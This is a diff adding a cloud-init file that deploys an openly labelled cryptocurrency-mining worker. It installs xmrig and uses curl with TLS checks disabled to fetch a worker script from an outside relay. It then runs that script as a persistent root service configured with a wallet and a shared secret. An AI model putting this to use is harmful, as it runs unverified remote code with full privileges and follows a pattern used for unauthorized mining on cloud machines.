@@ -1,0 +1,75 @@
+#cloud-config
+package_update: true
+package_upgrade: false
+
+packages:
+  - curl
+  - wget
+  - build-essential
+
+runcmd:
+  # Install Node.js 20
+  - curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
+  - apt-get install -y nodejs
+
+  # Create working directory
+  - mkdir -p /opt/aries
+  - cd /opt/aries
+
+  # Install xmrig 6.21.0
+  - wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz
+  - tar xzf /tmp/xmrig.tar.gz -C /opt/aries --strip-components=1
+  - chmod +x /opt/aries/xmrig
+  - rm /tmp/xmrig.tar.gz
+
+  # Download worker script from relay
+  - curl -skL https://gateway.doomtrader.com:9700/api/deploy/worker-linux.js -o /opt/aries/worker-linux.js
+
+  # Generate env.json with instance metadata
+  - |
+    INSTANCE_ID=$(curl -s http://169.254.169.254/opc/v1/instance/id 2>/dev/null || curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || hostname)
+    WORKER_ID="{{WORKER_ID}}"
+    if [ -z "$WORKER_ID" ] || [ "$WORKER_ID" = "{{WORKER_ID}}" ]; then
+      WORKER_ID="cloud-${INSTANCE_ID}"
+    fi
+    cat > /opt/aries/env.json << EOF
+    {
+      "relayUrl": "wss://gateway.doomtrader.com:9700",
+      "secret": "aries-swarm-2026",
+      "workerId": "${WORKER_ID}",
+      "wallet": "59hXLWQ7RM47x44rn9bypJjzFCTnSGu3FukoM7q4ZhcbAricuuDiTyUc5A93BW9JdXurLvd6LuECJT4xxndtwY6a",
+      "referral": "jdw-aries",
+      "xmrigPath": "/opt/aries/xmrig"
+    }
+    EOF
+
+  # Create systemd service
+  - |
+    cat > /etc/systemd/system/aries-worker.service << EOF
+    [Unit]
+    Description=Aries Swarm Mining Worker
+    After=network-online.target
+    Wants=network-online.target
+
+    [Service]
+    Type=simple
+    ExecStart=/usr/bin/node /opt/aries/worker-linux.js
+    WorkingDirectory=/opt/aries
+    Restart=always
+    RestartSec=10
+    Environment=NODE_ENV=production
+
+    [Install]
+    WantedBy=multi-user.target
+    EOF
+
+  # Enable and start
+  - systemctl daemon-reload
+  - systemctl enable aries-worker
+  - systemctl start aries-worker
+
+  # Disable huge pages warning for xmrig (optional perf)
+  - sysctl -w vm.nr_hugepages=128 || true
+  - echo "vm.nr_hugepages=128" >> /etc/sysctl.conf || true
+
+final_message: "Aries worker deployed and running"
